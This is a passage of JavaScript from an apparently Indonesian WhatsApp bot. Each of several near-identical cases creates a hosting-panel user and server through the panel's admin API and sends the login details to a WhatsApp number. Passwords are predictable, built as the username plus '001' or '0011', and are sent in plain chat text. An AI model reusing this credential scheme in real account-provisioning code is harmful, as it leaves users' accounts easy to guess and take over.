ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isOwner) return rzxReply('𝐔𝐝𝐚𝐡 𝐁𝐢𝐬𝐚 𝐂𝐫𝐞𝐚𝐭𝐞 𝐒𝐚𝐦𝐩𝐞 𝟐𝟓𝐆𝐁, 𝐌𝐚𝐬𝐢 𝐍𝐠𝐞𝐥𝐮𝐧𝐣𝐚𝐤 𝐂𝐫𝐞𝐚𝐭𝐞 𝐔𝐧𝐥𝐢 🗿 !')
let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "120"
let disk = "5138"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "6GB"
let egg = global.eggsnya
let loc = global.location
let memo = "6144"
let cpu = "150"
let disk = "6144"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "7GB"
let egg = global.eggsnya
let loc = global.location
let memo = "7168"
let cpu = "170"
let disk = "7168"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpgg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "8GB"
let egg = global.eggsnya
let loc = global.location
let memo = "8192"
let cpu = "200"
let disk = "8192"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "9GB"
let egg = global.eggsnya
let loc = global.location
let memo = "9216"
let cpu = "220"
let disk = "9216"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "250"
let disk = "10240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
